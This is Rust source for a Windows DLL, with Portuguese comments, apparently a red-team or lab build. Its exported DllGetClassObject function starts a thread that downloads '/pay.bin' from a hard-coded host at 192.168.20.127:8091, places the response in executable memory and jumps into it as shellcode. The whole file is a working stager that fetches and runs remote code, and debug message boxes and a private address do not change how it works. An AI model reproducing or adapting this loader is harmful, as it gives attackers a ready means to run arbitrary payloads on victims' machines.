#![allow(non_snake_case)]

use std::ffi::CString;
use std::ptr::{null_mut};
use std::mem::{zeroed, transmute};
use winapi::ctypes::c_void;
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::shared::ws2def::{AF_INET, SOCKADDR_IN, IPPROTO_TCP};
use winapi::um::winsock2::{
    WSADATA, WSAStartup, socket, connect, send, recv, closesocket, WSACleanup,
    INVALID_SOCKET, SOCKET, SOCK_STREAM,
};
use winapi::um::ws2tcpip::InetPtonW;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::shared::winerror::S_OK;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winuser::MessageBoxA;

// Helper para MAKEWORD
fn MAKEWORD(low: u8, high: u8) -> u16 {
    ((high as u16) << 8) | (low as u16)
}
#[link(name = "ws2_32")]
extern {}

unsafe extern "system" fn payload_thread(_param: LPVOID) -> DWORD {
    MessageBoxA(
        null_mut(),
        b"Iniciando payload_thread\0".as_ptr() as *const i8,
        b"DEBUG\0".as_ptr() as *const i8,
        0,
    );
    
    let mut wsa_data: WSADATA = zeroed();
    if WSAStartup(MAKEWORD(2, 2), &mut wsa_data) != 0 {
        return 1;
    }

    let sock = socket(AF_INET as i32, SOCK_STREAM, IPPROTO_TCP as i32);
    if sock == INVALID_SOCKET {
        WSACleanup();
        return 1;
    }

    let ip_wide: Vec<u16> = "192.168.20.127".encode_utf16().chain(Some(0)).collect();
    let mut addr: SOCKADDR_IN = zeroed();
    addr.sin_family = AF_INET as u16;
    addr.sin_port = 8091u16.to_be(); // htons
    if InetPtonW(AF_INET as i32, ip_wide.as_ptr(), &mut addr.sin_addr as *mut _ as *mut c_void) != 1 {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if connect(sock, &addr as *const _ as *mut _, std::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    let http_request = b"GET /pay.bin HTTP/1.1\r\nHost: 192.168.20.131\r\nConnection: close\r\n\r\n";
    send(sock, http_request.as_ptr() as *const i8, http_request.len() as i32, 0);

    let mut buffer = [0u8; 8192];
    let mut payload: *mut u8 = null_mut();
    let mut total_size = 0usize;
    let mut alloc_size = 0usize;

    loop {
        let received = recv(sock, buffer.as_mut_ptr() as *mut i8, buffer.len() as i32, 0);
        if received <= 0 {
            break;
        }

        if payload.is_null() {
            alloc_size = received as usize;
            payload = VirtualAlloc(
                null_mut(),
                alloc_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            ) as *mut u8;
        } else {
            let new_size = alloc_size + received as usize;
            let new_mem = VirtualAlloc(
                null_mut(),
                new_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            ) as *mut u8;

            if !new_mem.is_null() {
                std::ptr::copy_nonoverlapping(payload, new_mem, total_size);
                VirtualFree(payload as *mut c_void, 0, 0);
                payload = new_mem;
                alloc_size = new_size;
            } else {
                break;
            }
        }

        std::ptr::copy_nonoverlapping(
            buffer.as_ptr(),
            payload.add(total_size),
            received as usize,
        );
        total_size += received as usize;
    }

    closesocket(sock);
    WSACleanup();

    // Pula cabeçalho HTTP
    let data = std::slice::from_raw_parts(payload, total_size);
    if let Some(index) = twoway::find_bytes(data, b"\r\n\r\n") {
        let shellcode_ptr = payload.add(index + 4);
        let shell: extern "C" fn() = transmute(shellcode_ptr);
        shell();
    }

    0
}

#[no_mangle]
pub extern "system" fn DllGetClassObject(
    _rclsid: *const c_void,
    _riid: *const c_void,
    _ppv: *mut *mut c_void,
) -> i32 {
    unsafe {
        use winapi::um::winuser::MessageBoxA;

        MessageBoxA(
            null_mut(),
            b"[*] DllGetClassObject iniciada\0".as_ptr() as *const i8,
            b"EMBER\0".as_ptr() as *const i8,
            0,
        );

        let handle = CreateThread(
            null_mut(),
            0,
            Some(payload_thread),
            null_mut(),
            0,
            null_mut(),
        );

        if handle.is_null() {
            MessageBoxA(
                null_mut(),
                b"[!] Erro ao criar thread\0".as_ptr() as *const i8,
                b"EMBER\0".as_ptr() as *const i8,
                0,
            );
        } else {
            MessageBoxA(
                null_mut(),
                b"[+] Thread criada com sucesso\0".as_ptr() as *const i8,
                b"EMBER\0".as_ptr() as *const i8,
                0,
            );
        }
    }

    S_OK
}